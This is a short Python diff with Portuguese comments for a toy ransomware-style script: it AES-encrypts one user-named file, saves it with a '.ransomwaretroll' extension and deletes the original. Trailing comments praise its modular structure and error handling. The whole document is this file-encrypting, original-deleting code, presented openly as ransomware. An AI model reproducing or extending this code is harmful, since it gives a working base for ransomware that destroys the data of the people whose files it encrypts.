@@ -1,0 +1,53 @@
+import os
+import pyaes
+
+def criptografar_arquivo(file_name, key):
+    try:
+        # Verifica se o arquivo existe
+        if not os.path.exists(file_name):
+            print(f"Erro: O arquivo {file_name} não existe.")
+            return
+
+        # Abrir o arquivo original
+        with open(file_name, "rb") as file:
+            file_data = file.read()
+
+        # Chave para criptografia
+        aes = pyaes.AESModeOfOperationCTR(key)
+        encrypt_data = aes.encrypt(file_data)
+
+        # Criar o arquivo criptografado
+        new_file_name = file_name + ".ransomwaretroll"
+        with open(new_file_name, "wb") as new_file:
+            new_file.write(encrypt_data)
+
+        # Remover o arquivo original
+        os.remove(file_name)
+
+        print(f"Arquivo {file_name} criptografado com sucesso como {new_file_name}.")
+
+    except Exception as e:
+        print(f"Erro ao criptografar o arquivo: {e}")
+
+def main():
+    # Solicita ao usuário que insira o nome do arquivo e a chave
+    file_name = input("Digite o nome do arquivo a ser criptografado: ")
+    key = input("Digite a chave de criptografia: ").encode()
+
+    # Chama a função para criptografar o arquivo
+    criptografar_arquivo(file_name, key)
+
+if __name__ == "__main__":
+    main()
+    
+    
+    #Explicação das Melhorias:
+#Modularização: O código está dividido em funções (criptografar_arquivo e main) para melhorar a organização e a legibilidade.
+
+#Verificação de Existência do Arquivo: Verifica se o arquivo existe antes de tentar abri-lo ou removê-lo.
+
+#Tratamento de Exceções: Adicionado tratamento de exceções para lidar com possíveis erros durante a leitura, escrita ou remoção de arquivos.
+
+#Solicitação de Entrada do Usuário: Solicita o nome do arquivo e a chave de criptografia como entrada do usuário.
+
+#Uso de with para Gerenciamento de Arquivos: Utiliza o contexto with para abrir e fechar arquivos automaticamente, garantindo que eles sejam fechados corretamente.
